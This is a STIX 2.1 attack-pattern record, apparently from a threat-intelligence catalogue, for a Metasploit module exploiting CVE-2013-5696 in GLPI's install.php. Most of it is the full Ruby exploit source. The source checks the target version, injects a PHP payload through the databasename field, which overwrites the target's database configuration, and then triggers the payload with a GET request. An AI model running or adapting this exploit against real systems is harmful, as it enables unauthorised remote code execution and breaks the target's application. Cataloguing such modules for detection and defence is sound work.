{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad0af79a-d4a2-47e3-a824-0441159ba007",
    "created": "2024-08-14T17:10:14.440862Z",
    "modified": "2024-08-14T17:10:14.440865Z",
    "name": "GLPI install.php Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the GLPI 'install.php' script. This module is set to ManualRanking due to this module overwriting the target database configuration, which may introduce target instability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/glpi_install_rce.rb",
            "external_id": "glpi_install_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5696"
        },
        {
            "source_name": "reference",
            "url": "https://www.navixia.com/blog/entry/navixia-finds-critical-vulnerabilities-in-glpi-cve-2013-5696.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.glpi-project.org/forum/viewtopic.php?id=33762"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # Application database configuration is overwritten\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GLPI install.php Remote Command Execution',\n      'Description'    => %q{\n        This module exploits an arbitrary command execution vulnerability in the\n        GLPI 'install.php' script. This module is set to ManualRanking due to this\n        module overwriting the target database configuration, which may introduce target\n        instability.\n      },\n      'Author'         =>\n        [\n          'Tristan Leiter < research[at]navixia.com >', # Navixia Research Team\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-5696' ],\n          [ 'URL', 'https://www.navixia.com/blog/entry/navixia-finds-critical-vulnerabilities-in-glpi-cve-2013-5696.html' ],\n          [ 'URL', 'http://www.glpi-project.org/forum/viewtopic.php?id=33762' ],\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Payload'        =>\n        {\n          'Space'       => 4000,\n          'BadChars'    => \"#\",\n          'DisableNops' => true,\n          'Keys'        => ['php']\n        },\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'GLPI 0.84 or older', { }]],\n      'DisclosureDate' => '2013-09-12',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to GLPI', '/glpi/'])\n        ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    # Check if the GLPI instance is vulnerable\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(uri, 'index.php'),\n    })\n\n    if not res or res.code != 200\n      return Exploit::CheckCode::Safe\n    end\n\n    re = '(version)(\\\\s+)(.*)(\\\\s+)(Copyright)'\n    m = Regexp.new(re, Regexp::IGNORECASE)\n    matched = m.match(res.body)\n    if matched and matched[3] =~ /0.(8[0-4].[0-1])|([0-7][0-9].[0-9])/\n      vprint_good(\"Detected Version : #{matched[3]}\")\n      return Exploit::CheckCode::Appears\n    elsif matched\n      vprint_error(\"Version #{matched[3]} is not vulnerable\")\n    end\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n    print_status(\"Injecting the payload...\")\n    rand_arg = Rex::Text.rand_text_hex(10)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(uri, 'install/install.php'),\n      'vars_post' =>\n      {\n        'install'      => 'update_1',\n        'db_host'      => 'localhost',\n        'db_user'      => 'root',\n        'db_pass'      => 'root',\n        'databasename' =>\"'; } if(isset($_GET['#{rand_arg}'])){ #{payload.encoded} } /*\"\n      }\n    })\n\n    unless res and res.code == 200 and res.body =~ /You will update the GLPI database/\n      print_warning(\"Unexpected response while injecting the payload, trying to execute anyway...\")\n    end\n\n    print_status(\"Executing the payload...\")\n    send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(uri, 'index.php'),\n      'vars_get'  =>\n      {\n        rand_arg => '1',\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-12",
    "x_mitre_platforms": [
        "['php']"
    ]
}